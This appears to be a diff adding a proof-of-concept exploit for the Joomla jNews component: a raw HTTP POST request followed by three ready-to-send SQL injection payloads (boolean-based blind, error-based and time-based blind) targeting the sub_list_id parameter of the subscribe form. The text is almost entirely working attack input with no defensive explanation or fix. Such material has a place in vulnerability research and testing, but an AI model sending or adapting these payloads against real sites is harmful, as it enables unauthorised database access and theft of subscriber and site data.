@@ -1,0 +1,27 @@
+POST /joomlatest/index.php?option=com_jnews HTTP/1.1
+Host: example.com
+User-Agent: Hidden-user-agent-version
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://www.example.com/joomlatest/index.php?option=com_jnews&view=subscribe&act=subone&Itemid=206
+Cookie:
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 318
+
+POC_1: boolean-based blind
+Itemid=188&name=asdf&email=asdf@asdf.com&receive_html=0&timezone=00:00:00&confirmed=1&subscribed[1]=0&sub_list_id[1]=1
+RLIKE (SELECT (CASE WHEN (7097=7097) THEN 1 ELSE 0x28
+END))&acc_level[1]=29&passwordA=0oYmqypNqP6eU&fromFrontend=1&act=subscribe&subscriber_id=0&user_id=0&option=com_jnews&task=save&boxchecked=0&Itemid=188&d65abd4ca0e24f5d3e5af6b5c390ae17=1
+
+POC_2: error-based
+Itemid=188&name=asdf&email=asdf@asdf.com&receive_html=0&timezone=00:00:00&confirmed=1&subscribed[1]=0&sub_list_id[1]=1
+AND EXTRACTVALUE(8483,CONCAT(0x5c,0x716b787671,(SELECT
+(ELT(8483=8483,1))),0x716b786b71))&acc_level[1]=29&passwordA=0oYmqypNqP6eU&fromFrontend=1&act=subscribe&subscriber_id=0&user_id=0&option=com_jnews&task=save&boxchecked=0&Itemid=188&d65abd4ca0e24f5d3e5af6b5c390ae17=1
+
+POC_3: AND/OR time-based blind
+Itemid=188&name=asdf&email=asdf@asdf.com&receive_html=0&timezone=00:00:00&confirmed=1&subscribed[1]=0&sub_list_id[1]=(SELECT
+* FROM
+(SELECT(SLEEP(5)))Qrax)&acc_level[1]=29&passwordA=0oYmqypNqP6eU&fromFrontend=1&act=subscribe&subscriber_id=0&user_id=0&option=com_jnews&task=save&boxchecked=0&Itemid=188&d65abd4ca0e24f5d3e5af6b5c390ae17=1
